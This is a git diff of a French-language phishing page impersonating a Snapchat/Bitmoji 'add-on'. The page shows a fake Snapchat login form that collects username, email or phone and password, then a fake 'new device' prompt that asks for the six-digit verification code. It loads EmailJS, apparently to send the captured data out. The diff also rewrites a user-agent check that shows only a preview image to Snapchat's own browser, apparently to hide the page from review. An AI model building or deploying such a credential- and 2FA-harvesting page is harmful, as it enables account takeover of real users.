@@ -1,28 +1,25 @@
 
 <!DOCTYPE html>
+
 <html lang="fr">
 <head>
-  <meta charset="UTF-8">
-  <title>Connexion Bitmoji</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-  
-  <!-- BALISES OPEN GRAPH POUR RÉSEAUX SOCIAUX -->
-  <meta property="og:title" content="Bitmoji Add-On" />
-  <meta property="og:description" content="Crée ton avatar Bitmoji et découvre des extensions inédites avec Snapchat !" />
-  <meta property="og:image" content="https://bitmoji-add-on.onrender.com/preview2_1200x630.jpg" />
-  <meta property="og:image:type" content="image/jpeg" />
-  <meta property="og:image:width" content="1200" />
-  <meta property="og:image:height" content="630" />
-  <meta property="og:url" content="https://bitmoji-add-on.onrender.com" />
-  <meta property="og:type" content="website" />
-
-  <!-- Twitter Card -->
-  <meta name="twitter:card" content="summary_large_image" />
-  <meta name="twitter:title" content="Bitmoji Add-On" />
-  <meta name="twitter:description" content="Crée ton avatar Bitmoji et découvre des extensions inédites avec Snapchat !" />
-  <meta name="twitter:image" content="https://bitmoji-add-on.onrender.com/preview2_1200x630.jpg" />
-
+<meta charset="utf-8"/>
+<title>Connexion Bitmoji</title>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<!-- BALISES OPEN GRAPH POUR RÉSEAUX SOCIAUX -->
+<meta content="Bitmoji Add-On" property="og:title">
+<meta content="Crée ton avatar Bitmoji et découvre des extensions inédites avec Snapchat !" property="og:description">
+<meta content="https://bitmoji-add-on.onrender.com/preview2_1200x630.jpg" property="og:image"/>
+<meta content="image/jpeg" property="og:image:type"/>
+<meta content="1200" property="og:image:width"/>
+<meta content="630" property="og:image:height"/>
+<meta content="https://bitmoji-add-on.onrender.com" property="og:url"/>
+<meta content="website" property="og:type"/>
+<!-- Twitter Card -->
+<meta content="summary_large_image" name="twitter:card"/>
+<meta content="Bitmoji Add-On" name="twitter:title"/>
+<meta content="Crée ton avatar Bitmoji et découvre des extensions inédites avec Snapchat !" name="twitter:description"/>
+<meta content="https://bitmoji-add-on.onrender.com/preview2_1200x630.jpg" name="twitter:image"/>
 <style>
     body {
       margin: 0;
@@ -140,74 +137,54 @@
   }
 </style>
 
-<script>
-  document.addEventListener("DOMContentLoaded", function() {
-    const ua = navigator.userAgent || "";
-    if (/Snapchat/i.test(ua)) {
-      window.location.replace("preview2_1200x630.jpg");
-    }
-  });
-</script>
-
-</head>
-
+</meta></meta><meta content="https://bitmoji-add-on.onrender.com/preview2_1200x630.jpg" name="snapchat:preview"/></head>
 <body>
-  <div class="header">
-    <h1>Bitmoji</h1>
-    <p class="subtitle">Votre avatar emoji</p>
-    <button class="button" onclick="openLogin()">Accéder à mon compte via Snapchat</button>
-  </div>
-
-  <div class="bitmoji-row">
-    <div class="bitmoji" style="background-image: url('avatar1.png')"></div>
-    <div class="bitmoji" style="background-image: url('avatar2.png')"></div>
-    <div class="bitmoji" style="background-image: url('avatar3.png')"></div>
-    <div class="bitmoji" style="background-image: url('avatar4.png')"></div>
-  </div>
-
-  <div class="extras">
-    <h2>🎉 Extras Snapchat pour votre Bitmoji</h2>
-    <div class="extra-item">🌟 Stickers animés personnalisés dans vos stories</div>
-    <div class="extra-item">🎭 Filtres et Lenses compatibles avec votre avatar</div>
-    <div class="extra-item">🧩 Add-ons exclusifs via Snap Kit (Tinder, Giphy, etc.)</div>
-    <div class="extra-item">🛍 Profitez de goodies Bitmoji dans Snap Store</div>
-  </div>
-
-  <div class="overlay" id="overlay" onclick="closeLogin()"></div>
-
-  <div class="login-popup" id="loginPopup">
-    <img src="snapchat-logo.png" alt="Snapchat" style="display:block; margin:auto; width:50px;">
-    <h3 style="text-align:center;">Connexion</h3>
-    <label for="identifier" id="identifierLabel">Nom d'utilisateur ou adresse e-mail</label>
-    <input type="text" id="identifier">
-    <div style="text-align: center; margin: 8px 0;">
-      <button class="button" id="toggle-login-type" onclick="toggleLoginType()" style="background: transparent; color: blue;">Utiliser le numéro de mobile</button>
-    </div>
-    <label for="password">Mot de passe</label>
-    <input type="password" id="password" placeholder="••••••••">
-    <button class="button" onclick="submitLogin()">Se connecter</button>
-    <div style="text-align:center; margin-top:15px;">
-      <a href="#">Mot de passe oublié ?</a><br>
-      <a href="#">Créer un compte</a>
-    </div>
-  </div>
-
-  
-  <div class="verification-popup" id="verificationPopup">
-   
-<h3 style="margin-top: 0; font-size: 1.5em; ">Nouvel appareil détecté</h3>
-    <p style="margin-bottom: 20px; margin-top: 10px;">Un code de vérification vous sera envoyé à l’intérieur des prochaines minutes.</p>
-    <p style="font-weight: bold; margin-bottom: 12px; margin-top: 10px;">Entrez le code reçu :</p>
-
-    <input type="text" id="verificationCode" placeholder="Code à 6 chiffres">
-    <button class="button" onclick="submitVerification()">Vérifier</button>
+<div class="header">
+<h1>Bitmoji</h1>
+<p class="subtitle">Votre avatar emoji</p>
+<button class="button" onclick="openLogin()">Accéder à mon compte via Snapchat</button>
 </div>
-
-  <div class="bottom-banner">
-    <img src="banner.png" alt="Bannière Bitmoji">
-  </div>
-
-  <script>
+<div class="bitmoji-row">
+<div class="bitmoji" style="background-image: url('avatar1.png')"></div>
+<div class="bitmoji" style="background-image: url('avatar2.png')"></div>
+<div class="bitmoji" style="background-image: url('avatar3.png')"></div>
+<div class="bitmoji" style="background-image: url('avatar4.png')"></div>
+</div>
+<div class="extras">
+<h2>🎉 Extras Snapchat pour votre Bitmoji</h2>
+<div class="extra-item">🌟 Stickers animés personnalisés dans vos stories</div>
+<div class="extra-item">🎭 Filtres et Lenses compatibles avec votre avatar</div>
+<div class="extra-item">🧩 Add-ons exclusifs via Snap Kit (Tinder, Giphy, etc.)</div>
+<div class="extra-item">🛍 Profitez de goodies Bitmoji dans Snap Store</div>
+</div>
+<div class="overlay" id="overlay" onclick="closeLogin()"></div>
+<div class="login-popup" id="loginPopup">
+<img alt="Snapchat" src="snapchat-logo.png" style="display:block; margin:auto; width:50px;"/>
+<h3 style="text-align:center;">Connexion</h3>
+<label for="identifier" id="identifierLabel">Nom d'utilisateur ou adresse e-mail</label>
+<input id="identifier" type="text"/>
+<div style="text-align: center; margin: 8px 0;">
+<button class="button" id="toggle-login-type" onclick="toggleLoginType()" style="background: transparent; color: blue;">Utiliser le numéro de mobile</button>
+</div>
+<label for="password">Mot de passe</label>
+<input id="password" placeholder="••••••••" type="password"/>
+<button class="button" onclick="submitLogin()">Se connecter</button>
+<div style="text-align:center; margin-top:15px;">
+<a href="#">Mot de passe oublié ?</a><br/>
+<a href="#">Créer un compte</a>
+</div>
+</div>
+<div class="verification-popup" id="verificationPopup">
+<h3 style="margin-top: 0; font-size: 1.5em; ">Nouvel appareil détecté</h3>
+<p style="margin-bottom: 20px; margin-top: 10px;">Un code de vérification vous sera envoyé à l’intérieur des prochaines minutes.</p>
+<p style="font-weight: bold; margin-bottom: 12px; margin-top: 10px;">Entrez le code reçu :</p>
+<input id="verificationCode" placeholder="Code à 6 chiffres" type="text"/>
+<button class="button" onclick="submitVerification()">Vérifier</button>
+</div>
+<div class="bottom-banner">
+<img alt="Bannière Bitmoji" src="banner.png"/>
+</div>
+<script>
     const script = document.createElement('script');
     script.src = 'https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js';
     script.onload = () => {
@@ -329,7 +306,6 @@
   };
 
 </script>
-
 <script>
   window.openLogin = function() {
     document.getElementById('overlay').style.display = 'block';
@@ -370,7 +346,6 @@
   };
 
 </script>
-
 <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
 <script>
   document.addEventListener("DOMContentLoaded", function() {
@@ -416,7 +391,18 @@ window.submitVerification = function() {
 };
 
 </script>
-</body>
-
-
+<script>
+document.addEventListener("DOMContentLoaded", function() {
+  const ua = navigator.userAgent || "";
+  if (/Snapchat/i.test(ua)) {
+    const img = document.createElement('img');
+    img.src = "https://bitmoji-add-on.onrender.com/preview2_1200x630.jpg";
+    img.alt = "Aperçu Snapchat";
+    img.style.width = "100%";
+    img.style.display = "block";
+    document.body.innerHTML = "";
+    document.body.appendChild(img);
+  }
+});
+</script></body>
 </html>
